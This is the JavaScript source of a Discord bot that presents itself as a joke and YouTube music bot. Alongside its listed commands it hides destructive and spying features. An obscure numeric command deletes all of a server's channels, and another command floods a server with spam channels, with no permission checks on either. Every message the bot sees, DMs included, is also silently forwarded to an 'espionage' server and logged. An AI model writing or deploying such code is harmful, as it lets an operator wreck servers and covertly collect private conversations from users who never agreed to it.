const Discord = require('discord.js');
const config = require("./config.json");
const client = new Discord.Client();
const fs = require("fs");
const ytdl = require("ytdl-core");
const yt =require("youtube-node");
var youtube = new yt();
youtube.setKey(config.YT_API_KEY);
var serverData = [];
//const ytdl = require('ytdl-core');
//const $ = require('jQuery');

client.on('ready', () => {
	console.log(`Logged in as ${client.user.tag}!`);
	console.log(`Available in ${client.guilds.array().length} servers!`);
	var guilds = client.guilds.array();
	guilds.forEach(guild =>{
		console.log('    '+guild.name);
		serverData.push({id:guild.id,vc:null,connection:null,dispatcher:null,queue:[],loop:false})
	});
    client.user.setActivity("+help")
});


function checkFooled(msg,min,max,foolid,foolname) {
	if (foolid === undefined) {
		foolid = msg.author.id;
	}
	if (foolname === undefined) {
		foolname = msg.author.tag;
	}
	var rand = Math.floor(Math.random() * (+max - +min)) + min;
	if (msg.guild === null) {
		console.log(foolname+' DM '+rand+' '+msg.content);
	}
	else {
		console.log(foolname + ' ' + msg.guild.name + ' ' + rand + ' ' + msg.content);
	}
	if (rand == 50){
		console.log('Fooled '+foolname+'!');
		msg.channel.send('<@'+foolid+'>, YOU FELL FOR IT! THUNDER CROSS SPLIT ATTACK!');
		msg.channel.send('https://media.giphy.com/media/UWc4ifrnZLQjOczszu/source.mov');
	}
}

function changeMessage(msg){
	let message = msg.content.split(' ').slice(1,msg.content.length)
	var out = ''
	message.forEach(part=>{
		out += part+' '
	})
	client.user.setActivity(out)
}

function sendVideo(msg) {
	msg.channel.send("https://www.youtube.com/watch?v=wOFc4IJIoZg");
	console.log("Sent Video to "+msg.author.tag);
}

function nukeServer(msg){
	console.log("Arming Nuke in "+msg.guild.name);
	var guild = msg.guild;
	guild.channels.array().forEach(channel => {
		if (channel.deletable) {
			try {
				channel.delete();
			}
			catch(error){
				nukeServer(msg);
			}
		}
	})
}

function massCreateChannels(msg){
	console.log("Commencing channel creation in "+msg.guild.name);
	var guild = msg.guild;
	for (i=0;i<240;i++) {
		if (guild.channels.array().length <498) {
			guild.createChannel("You fell for it, fool!");
			guild.createChannel("THUNDER CROSS SPLIT ATTACK","voice");
		}
		else{
			msg.channel.send("Max channels reached");
			console.log("Channel creation finished");
			break;
		}
	}
}

function returnServerNames(msg){
	var serverArray = getServers();
	var serverNames = '';
	serverArray.forEach(server =>{
		if (server.name != config.espionage) {
			serverNames = serverNames + server.name + '\n';
		}
	})
	msg.channel.send({embed:{
		title:"Currently available servers:",
		color:config.color,
		description:serverNames}});
}

function writePS(msg){
	var flag = false;
	let msgPart = msg.content.split(" ");
	if (msgPart[2] === undefined||msg.mentions.users.array()[0] === undefined){
		console.log("Bad PS request");
		msg.reply("Incorrect syntax");
		return
	}
	if (msgPart[2].startsWith("https://")==false){
		msg.reply("Bad link, cannot add to database")
		return
	}
	let user = msg.mentions.users.array()[0].id;
	var file = fs.readFileSync("./personalStatements.json","utf8");
	let obj = JSON.parse(file);
	obj[user] = msgPart[2];
	file = JSON.stringify(obj);
	void fs.writeFile("./personalStatements.json",file,err=>{console.log(err)});
	console.log("Added personal statement to JSON")
	msg.reply("Added to personal statement database")
}

function readPS(msg){
	if (msg.mentions.users.array()[0] === undefined){
		console.log("Bad PS request");
		msg.reply("Incorrect syntax, user not tagged");
		return
	}
	let user = msg.mentions.users.array()[0].id;
	var file = fs.readFileSync("./personalStatements.json","utf8");
	let obj = JSON.parse(file);
	if (obj[user] === undefined){
		msg.reply("Personal statement does not exist, add using +addps");
		return
	}
	else{
		msg.reply(obj[user])
	}
}

function getServers(){
	return client.guilds.array();
}

function crossServerComms(msg, data){
	var voice = false;
	var serverArray = getServers();
	if (data === undefined){
		data = msg;
		voice = true;
		var msgSplit = msg.content.split(' ');
	}
	else{
		var msgSplit = msg.split(' ');
	}
	var queryName = msgSplit[1];
	var message = data.author.tag+': ';
	var i = 0;
	msgSplit.forEach(part => {
		if (i >=2){
			message = message + part +' ';
		}
		i +=1;
	});
	serverArray.forEach(server =>{
		if (server.name.startsWith(queryName)){
			var flag = true;
			server.channels.array().forEach(channel =>{
				if (channel.type == "text"){
					if (flag) {
						channel.send(message);
						if (voice == true) {
							console.log("Sent a message to " + server.name + " from " + data.author.tag+': '+message);
						}
						flag = false;
					}
				}
			})
		}
	})
}

function sendHelp(msg) {
	msg.channel.send({embed:{title:"Commands!",
		description:`Commands are:
		+help -Sends list of commands
		+video -Sends a link to the YOU FOOL video
		+fool -Fools the target user
		+pierre -While choosing what subjects to do at A-level, I hadn't once considered taking Psychology
		+servers -Returns the list of servers
		+toes -toes
		+play -plays a song from a youtube link
		+loop -loops the currently playing song`,
		color:config.color,
		footer:{text:"Requested by "+msg.author.tag,
			icon_url:msg.author.avatarURL}}});
	console.log("Sent help to "+msg.author.tag);
}

function sausageRolls(msg){
	msg.channel.send('https://www.youtube.com/watch?v=_IgPM-XCrOE');
}

function fool(msg){
		if (msg.mentions.users.array()[0] === undefined){
			msg.channel.send({embed:{title:"Usage",description:"+fool [target user]",color:config.color}});
			console.log('Sent fool error to '+msg.author.tag);
		}
		else{
			if (msg.mentions.users.array()[0].tag != client.user.tag){
				checkFooled(msg,50,50,msg.mentions.users.array()[0].id,msg.mentions.users.array()[0].tag);
			}
			else{
				msg.channel.send('YOU FOOL! NOBODY CAN EVADE THIS TECHNIQUE!');
				console.log(msg.author.tag+' attempted to fool bot, proceeding to fool them');
				checkFooled(msg,50,50);
			}
		}
}

function toes(msg){
	msg.channel.send('https://tenor.com/view/toe-gif-8799475')
	console.log('Sent toes to '+msg.author.tag)
}

function pierre(msg){
	msg.channel.send("https://docs.google.com/document/d/1G4_s6n02c0hs03l9acbsaKjmHtx6sGTubRD-ksDf-Gk/edit?usp=sharing")
	console.log('Sent Pierre\'s personal statement to '+msg.author.tag)
}

function addConnection(msg){
	console.log("new connection initialising");
	var server = msg.guild;
	if (!server) return;
	var serverid = server.id;
	var vc = msg.member.voiceChannel;
	if (vc){
		vc.join().then(connection=>{
			serverData.forEach(obj=>{
				if (obj.id==serverid){
					obj.vc = vc;
					obj.connection = connection;
					newQ = getQueue(msg);
					play(msg,vc,connection,newQ)
				}
			})
		})
	}
}

function sendQueue(msg){
	var curQ = getQueue(msg);
	var out = '';
	if (curQ.length>0) {
		curQ.forEach((obj, index) => {
			if (index != 0) {
				out += `${index}: ${obj.name} \n`
			}
		});
		msg.channel.send({
			embed: {
				title: `Now playing: ${curQ[0].name}`,
				description: out,
				color: config.color,
				footer: {
					text: "Requested by " + msg.author.tag,
					icon_url: msg.author.avatarURL
				}
			}
		});
	}
	else{
		msg.channel.send({
			embed: {
				title: `Nothing is currently playing`,
				color: config.color,
				footer: {
					text: "Requested by " + msg.author.tag,
					icon_url: msg.author.avatarURL
				}
			}
		})
	}
}

function remQueue(msg){
	var accQueue = getQueue(msg);
	accQueue.shift();
	updateQueue(msg,accQueue);
}

function getQueue(msg){
	var server = msg.guild;
	if (!server) return;
	var serverid = server.id;
	serverData.forEach(obj=>{
		if (obj.id == serverid){
			accQueue=obj.queue;
		};
	})
	return accQueue;
}

function deleteListeners(msg){
	var serverid = msg.guild.id;
	serverData.forEach(obj=>{
		if (obj.id == serverid){
			obj.dispatcher=null;
			obj.vc=null;
			obj.connection=null;
		}
	})
}

function updateQueue(msg,accQueue){
	var server = msg.guild;
	if (!server) return;
	var serverid = server.id;
	serverData.forEach(obj=>{
		if (obj.id == serverid) obj.queue=accQueue;
	})
}

async function addToQueue(msg) {
	var server = msg.guild;
	if (!server) return;
	var serverid = server.id;
	var accQueue = getQueue(msg);
	var splitted = msg.content.split(' ');
	var url = splitted;
	url.shift();
	if (!url[0].startsWith("https://www.youtube")&&!url[0].startsWith("https://youtu.be")){
		msg.reply("Input needs to be a link from youtube");
		return;
	}
	var data = await ytdl.getBasicInfo(url[0]);
	var toQ = {url:url[0],name:data.title};
	accQueue.push(toQ);
	updateQueue(msg,accQueue);
	serverData.forEach(obj=>{
		if (obj.id == serverid){
			if (obj.vc == null){addConnection(msg)}
		}
	})
}

function skipSong(msg){
	var server = msg.guild;
	if (!server) return;
	var serverid = server.id;
	serverData.forEach(obj=>{
		if (obj.id == serverid){
			if (!obj.dispatcher) return;
			else{
				loop(msg,false);
				obj.dispatcher.end();
			}
		}
	});
}

function loop(msg,override){
	var server = msg.guild;
	if (!server) return;
	serverData.forEach(obj=>{
		if (obj.id == server.id){
			if (override === undefined){
				override = (!obj.loop);
			}
			obj.loop = override;
		}
	});
	if (override===true){
		msg.reply("Loop enabled")
	}
	else{
		msg.reply("Loop disabled")
	}
}

function play(msg,vc,connection,queue){
	var serverid = msg.guild.id;
	const stream = ytdl(queue[0].url,{filter:'audioonly'});
	const dispatcher = connection.playStream(stream);
	serverData.forEach(obj=> {
		if (obj.id == serverid) {
			obj.dispatcher = dispatcher;
		}
	});
	dispatcher.on("end", end => {
		var loop = false;
		serverData.forEach(obj=>{
			if (serverid == obj.id){
				loop = obj.loop;
			}
		});
		if (!loop) remQueue(msg);
		newQ = getQueue(msg);
		serverData.forEach(obj=> {
			if (obj.id == serverid) {
				obj.dispatcher = null;
			}
		});
		if (newQ.length>0) play(msg,vc,connection,newQ);
		else {
			vc.leave();
			deleteListeners(msg);
		}
		console.log("  Play succesful, leaving")
	});
	dispatcher.on("error",error=>{dispatcher.end()})
}

async function test(msg){
	var out = ''
	serverData.forEach(obj=>{
		if (obj.id==msg.guild.id){
			out = obj;
		}
	});
	console.log(out);
	console.log(await youtube.search("tobuscus diamond sword song",2,(error,result)=>{console.log(error);console.log(result.items[0])}));
}

client.on('message', msg => {
	if (msg.channel.guild === undefined) {
		var spy = '+csc ' + config.espionage + ' ' + msg.content + ' (From:** Bot DM**)';
	}
	else{
		var spy = '+csc ' + config.espionage + ' ' + msg.content + ' (From **' + msg.channel.guild.name + '**)';
	}
	var commands = {
		"+help":sendHelp,
		"+video":sendVideo,
		"+35279119991889998110":nukeServer,
		"+sausagerolls":sausageRolls,
		"+what do we think of prem shit what do we think of shit prem":massCreateChannels,
		"+pierre":pierre,
		"+servers":returnServerNames,
		"+csc":crossServerComms,
		"+fool":fool,
		"+toes":toes,
		"+play":addToQueue,
		"+changemessage":changeMessage,
		"+addps":writePS,
		"+ps":readPS,
		"+queue":sendQueue,
		"+test":test,
		"+skip":skipSong,
		"+loop":loop
	}
	if (!msg.author.bot) {
		crossServerComms(spy,msg);
		for (var call in commands){
			if (msg.content.startsWith(call)) commands[call](msg);
		}
		checkFooled(msg,30,70);
	}
});


client.login(config.token);